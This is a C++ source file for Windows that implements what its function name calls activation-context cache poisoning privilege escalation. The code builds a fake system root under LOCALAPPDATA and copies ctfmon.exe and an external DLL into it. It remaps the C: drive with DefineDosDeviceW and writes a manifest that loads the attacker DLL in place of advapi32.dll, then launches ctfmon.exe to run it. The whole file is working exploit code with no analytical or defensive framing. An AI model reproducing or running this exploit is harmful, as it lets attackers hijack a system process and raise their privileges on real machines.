#include "pch.h"
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <Shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "shell32.lib")

BOOL WriteWideFile(const wchar_t* path, const wchar_t* data) {
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
    BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
    CloseHandle(h);
    return ok;
}

int ActivationContextCachePoisoningEscalationInternal() {
    wchar_t rootPath[MAX_PATH] = { 0 };
    wchar_t rootSystem32Path[MAX_PATH] = { 0 };
    wchar_t ctfmonPath[MAX_PATH] = { 0 };
    wchar_t externalDllPath[MAX_PATH] = { 0 };
    wchar_t externalDllDestPath[MAX_PATH] = { 0 };
    wchar_t manifestPath[MAX_PATH] = { 0 };

    if (!ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\Mabean\\data\\rootC", rootPath, MAX_PATH)) {
        printf("ExpandEnvironmentStrings failed: %lu\n", GetLastError());
    }

    PathCombineW(rootSystem32Path, rootPath, L"Windows\\System32");

    PathCombineW(ctfmonPath, rootSystem32Path, L"ctfmon.exe");

    if (!ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\Mabean\\data\\Dlls\\ExternalDll.dll", externalDllPath, MAX_PATH)) {
        printf("ExpandEnvironmentStrings failed: %lu\n", GetLastError());
    }

    PathCombineW(externalDllDestPath, rootSystem32Path, L"ExternalDll.dll");

    SHCreateDirectoryExW(NULL, rootSystem32Path, NULL);
    CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", ctfmonPath, FALSE);
    CopyFileW(externalDllPath, externalDllDestPath, FALSE);

    wchar_t ntPath[MAX_PATH + 4];
    swprintf_s(ntPath, MAX_PATH + 4, L"\\??\\%s", rootPath);

    DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
        L"C:", ntPath);

    PathCombineW(manifestPath, rootSystem32Path, L"payload.manifest");

    wchar_t manifest[2048] = { 0 };
    swprintf_s(manifest, 2048,
        L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
        L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
        L" <dependency><dependentAssembly>"
        L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
        L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
        L"  <file name='advapi32.dll' loadFrom='%s' />"
        L" </dependentAssembly></dependency></assembly>",
        externalDllDestPath);

    WriteWideFile(manifestPath, manifest);

    ACTCTXW act = { sizeof(act) };
    act.lpSource = manifestPath;
    ULONG_PTR cookie = 0;
    HANDLE ctx = CreateActCtxW(&act);
    ActivateActCtx(ctx, &cookie);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, 2000);
    DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", ntPath);
    CloseHandle(ctx);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}